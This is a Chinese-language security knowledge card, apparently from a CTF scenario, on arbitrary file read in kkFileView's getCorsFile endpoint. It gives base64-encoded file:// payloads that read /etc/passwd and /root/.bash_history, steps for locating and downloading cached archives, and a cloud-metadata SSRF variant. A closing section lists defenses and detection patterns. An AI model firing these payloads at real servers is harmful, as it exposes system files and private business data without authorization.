---
id: web-java-component-kkfileview-getcorsfile-bashhistory-cache-artifact
title: kkFileView getCorsFile 任意文件读取：读 .bash_history 定位解析缓存目录并下载归档
type: scenario
domain: web
path: web/java/component
technique: url-fetch-scheme-host-not-validated
aliases:
- kkFileView 任意文件读取
- getCorsFile urlPath
- .bash_history 泄露缓存目录
- 解析缓存归档下载
- Northbridge Document Hub
tags:
- java
- kkfileview
- ssrf
- arbitrary-file-read
- file-scheme
- information-disclosure
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:31:34+08:00'
  notes: 已对照原文与图12-14核对：portal.js 泄露 auth.seed 与 fileGateway 的 /kkfileview/getCorsFile?urlPath=、file 协议的 /etc/passwd 与 /root/.bash_history 的 base64 读取、历史中 cache.dir=/opt/kkfileview/cache/parsed 与 q1_finance_report_2026.zip、缓存归档 flag.txt 均与卡片一致。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
---

## 一句话结论

kkFileView 的 `/kkfileview/getCorsFile?urlPath=` 接受 base64 编码的任意 URL 且不限制 `file://`，可读取 `/etc/passwd` 等任意文件；进一步读取 `/root/.bash_history` 可发现 `--cache.dir` 指向的解析缓存目录，从而直接下载服务端已解析归档中的敏感文件。

## 原理

- kkFileView 为在线预览需要服务端代取文件，`getCorsFile` 把 `urlPath` 当资源地址直接读取并回显。
- 参数未做协议白名单与目标校验，`file://` 被允许，因此可读服务进程权限下的本地文件。
- 服务启动脚本常把缓存目录作为命令行参数写入（`--cache.dir=/opt/kkfileview/cache/parsed`），该命令会留在 `~/.bash_history`。
- 缓存目录保存了解析后的文件（含用户上传的归档），读取历史记录即可定位缓存路径，再通过同一文件读取原语下载缓存中的 zip/文档，获取业务敏感内容。

## 触发条件

- 目标暴露 kkFileView 的 `getCorsFile` 接口，且 `urlPath` 未限制协议与目标。
- 服务以可读 `/root/.bash_history`、缓存目录的权限运行。
- 缓存目录中存在已解析的敏感归档。

## 利用步骤

1. 从源码/前端 JS 中发现接口与参数：`/kkfileview/getCorsFile?urlPath=<base64(url)>`。
2. 读取 `/etc/passwd` 验证：`urlPath=ZmlsZTovLy9ldGMvcGFzc3dk`（`file:///etc/passwd` 的 base64）。
3. 读取 `/root/.bash_history`：`urlPath=ZmlsZTovLy9yb290Ly5iYXNoX2hpc3Rvcnk=`。
4. 从历史中提取 `--cache.dir`（如 `/opt/kkfileview/cache/parsed`）与缓存文件名（如 `q1_finance_report_2026.zip`）。
5. 用同一接口读取缓存文件并下载，打开归档取 flag/敏感数据。

## PoC

```text
file:///etc/passwd
-> /kkfileview/getCorsFile?urlPath=ZmlsZTovLy9ldGMvcGFzc3dk

file:///root/.bash_history
-> /kkfileview/getCorsFile?urlPath=ZmlsZTovLy9yb290Ly5iYXNoX2hpc3Rvcnk=
```

```text
# .bash_history 回显
cd /opt/kkfileview/bin
./startup.sh --cache.dir=/opt/kkfileview/cache/parsed
cp /opt/kkfileview/cache/parsed/q1_finance_report_2026.zip /tmp/q1_finance_report_2026.zip
```

## 变体与关联

- 缓存目录也可从 `/proc/self/cmdline`、启动脚本、应用配置中获取。
- `file://` 换成 `http://169.254.169.254/...` 可扩展为云元数据 SSRF。
- 关联：[[web-java-component-kkfileview-getcorsfile-urlpath-ssrf-file-read]]（同一接口的通用 SSRF/文件读取卡）。

## 检测与防御

- 升级 kkFileView，对 `urlPath` 做协议白名单（仅 http/https）与内网/回环地址校验，禁止 `file://`。
- 以最小权限运行，限制缓存目录与历史文件可读性；清理启动脚本中的敏感路径。
- 检测 `urlPath` 中出现 base64 编码的 `file://`、`.bash_history`、`/proc/self`、云元数据地址。
